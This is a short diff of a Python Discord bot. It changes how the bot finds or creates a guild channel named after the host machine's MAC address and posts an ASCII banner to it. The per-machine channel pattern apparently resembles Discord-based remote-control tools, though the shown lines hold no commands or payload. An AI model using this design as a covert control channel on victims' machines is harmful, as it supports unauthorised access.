@@ -105,18 +105,16 @@ async def on_ready():
     guild = client.get_guild(int(guild_id))
     mac_address = str(get_mac())
     print(await find_channel_by_name(guild, mac_address))
-    text_channel= await create_channel(guild, mac_address)
+    channel = await find_channel_by_name(guild, mac_address)
+    if channel:
+        print("Channel with name {} already exists.".format(mac_address))
+        await channel.send("```" + new_ascii + "```")
+    else:
+        print("Channel with name {} does not exist. Creating...".format(mac_address))
+        channel = await guild.create_text_channel(mac_address)
+        await channel.send("```" + new_ascii + "```")
 
-    if text_channel:
-        firstrun = True if text_channel.created_at else False
-
-            
-        if firstrun:
-            await text_channel.send("```"+ new_ascii+ "```\n @everyone")
-
-        else:
-            await text_channel.send("```"+ new_ascii+ "```\n @everyone")
-
+        
 @client.event
 async def on_message(message):
     guild = client.get_guild(int(guild_id))
